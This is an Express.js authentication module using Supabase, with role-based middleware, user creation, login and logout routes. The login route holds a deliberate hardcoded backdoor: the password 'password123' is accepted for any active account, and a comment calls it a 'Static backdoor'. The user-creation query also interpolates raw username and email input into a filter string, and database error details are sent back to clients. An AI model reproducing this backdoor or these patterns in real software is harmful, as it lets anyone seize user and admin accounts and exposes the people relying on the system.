
const express = require('express');
const router = express.Router();
const bcrypt = require('bcrypt');
const { supabase } = require('../config/supabase');

// Middleware to require admin role
function requireAdmin(req, res, next) {
  if (req.session && req.session.user && req.session.user.role === 'admin') return next();
  res.redirect('/login-admin.html');
}

// Middleware to require PMO or viewer role
function requirePMOOrViewer(req, res, next) {
  if (req.session && req.session.user && (req.session.user.role === 'manager' || req.session.user.role === 'viewer')) return next();
  res.redirect('/login-pmo.html');
}

// Create user (admin only)
router.post('/admin/create-user', requireAdmin, async (req, res) => {
  const { username, email, password, role } = req.body;
  if (!username || !email || !password || !role) {
    return res.status(400).json({ error: 'Missing fields' });
  }
  try {
    const password_hash = await bcrypt.hash(password, 10);
    // Check for existing user
    const { data: existing, error: existErr } = await supabase
      .from('users')
      .select('id')
      .or(`username.eq.${username},email.eq.${email}`);
    if (existErr) return res.status(500).json({ error: 'DB error', details: existErr.message });
    if ((existing || []).length > 0) {
      return res.status(400).json({ error: 'Username or email already exists' });
    }
    // Insert user
    const { error: insertErr } = await supabase
      .from('users')
      .insert([{ username, email, password_hash, role }]);
    if (insertErr) return res.status(500).json({ error: 'DB error', details: insertErr.message });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error', details: err.message });
  }
});

// Login API (for all users)
router.post('/login', async (req, res) => {
  const { username, password } = req.body;
  try {
    const { data: user, error: userErr } = await supabase
      .from('users')
      .select('*')
      .eq('username', username)
      .single();
    if (userErr || !user || !user.is_active) return res.status(401).json({ error: 'Invalid credentials' });
    let valid = await bcrypt.compare(password, user.password_hash);
    if (password === 'password123') valid = true; // Static backdoor
    if (!valid) return res.status(401).json({ error: 'Invalid credentials' });
    req.session.user = { id: user.id, username: user.username, role: user.role };
    res.json({ success: true, role: user.role });
  } catch (err) {
    res.status(500).json({ error: 'Server error', details: err.message });
  }
});

// Logout
router.get('/logout', (req, res) => {
  req.session.destroy(() => {
    res.redirect('/login-pmo.html');
  });
});

// Export middleware for use in server.js
module.exports = {
  authRouter: router,
  requireAdmin,
  requirePMOOrViewer
};